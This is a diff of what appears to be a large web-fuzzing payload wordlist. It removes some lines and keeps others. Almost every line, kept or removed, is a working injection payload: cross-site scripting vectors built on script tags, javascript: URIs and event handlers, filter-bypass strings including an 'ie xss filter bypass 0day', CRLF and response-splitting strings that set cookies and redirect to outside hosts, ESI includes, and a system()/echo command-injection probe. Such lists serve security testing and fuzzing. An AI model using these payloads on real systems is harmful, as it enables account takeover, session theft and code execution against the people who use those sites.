@@ -13941,7 +13941,6 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 %bf%0d
 %c0%0a
 %c0%0d
-%c0″//(0000%0dconfirm(1)//
 %c1%0a
 %c1%0d
 %c2%0a
@@ -21610,8 +21609,6 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 <code>0%0d%0a%00&lt;script src=//h4k.in&gt;</code>
 <code>;//%0da=eval;b=alert;a(b(10));//</code>
 <details%0aopen%0aontoggle%0a=%0aa=prompt,a() x>
-<details%0aopen%0aontoggle%0a=%0aa=prompt,a() x>"'`ʼˈ‘’‚‛“”„‟′″‴‵‶‷﹅﹐＂＇，舧艠︐︑--><script>alert(42)</script>
-<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">x</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!doctype x system "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onload" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
 <div>javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e</div>
 <esi:include src="http://google.com%0d%0ax-forwarded-for:%20127.0.0.1%0d%0ajunkheader:%20junkvalue/"/>
 <iframe src="data:message/rfc822,content-type: text/html;%0acontent-transfer-encoding: quoted-printable%0a%0a=3cscript=3econfirm(document.location)=3c/script=3e"></iframe>
@@ -21640,8 +21637,6 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 <script language="vbscript">%0a%0dfunction window_onload%0a%0dalert 1%0a%0dend function </script>
 <script%0a%0dconfirm(1);</script>
 <script%0daaa>alert(1)</script%0daaaa>
-<script/%00%00v%00%00>confirm(/@jackmasa/)</script> and %c0â€³//(%000000%0dconfirm(1)//
-<script/%00%00v%00%00>confirm(/@jackmasa/)</script> and %c0″//(%000000%0dconfirm(1)//
 <script>/*javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e*/</script>
 <script>//>%0aalert(1);</script>
 <script>//javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e</script>
@@ -23512,11 +23507,8 @@ hsqldb%0a
 http/1.1+200+ok%0acontent-type:+text/html%0acontent-length:+132%0acontent-encoding:+deflate%0a%0ad0up0izunnnnnnnnnnnnnnnnnnnuu5nnnnnn3suunuuuwciudibeatwwwet33sgdttwgdddgg03sdggwggtdtt33333sg03333sdddfpcokwgwossgkwoemucmokwgwos4
 http/1.1+200+ok%0d%0acontent-type:+text/html%0d%0acontent-length:+132%0d%0acontent-encoding:+deflate%0d%0d%0a%0ad0up0izunnnnnnnnnnnnnnnnnnnuu5nnnnnn3suunuuuwciudibeatwwwet33sgdttwgdddgg03sdggwggtdtt33333sg03333sdddfpcokwgwossgkwoemucmokwgwos4
 http:%0a%0dlocaldomain.pw
-http:%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://%0a%0dlocaldomain.pw
-https://%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 i2rb?_33#%0doyw?n\f8uc)_yd`%}
-ie xss filter bypass 0day :<script/%00%00v%00%00>alert(/@jackmasa/)</script> and %c0″//(%000000%0dalert(1)// #ie #0day
 injectx%0ainjectx%3dinjectx%0a
 injectx%0aset-cookie%3ainject%3dinjectxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%0alocation%3ahttp%3a%2f%2fsn1persecurity.com%2f.testing%2fiframe_injection.php%0a%0a
 injectx%0aset-cookie%3ainject%3dinjectxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3b%0alocation%3ahttp%3a%2f%2fxerosecurity.com%2f.testing%2fiframe_injection.php%0a%0a
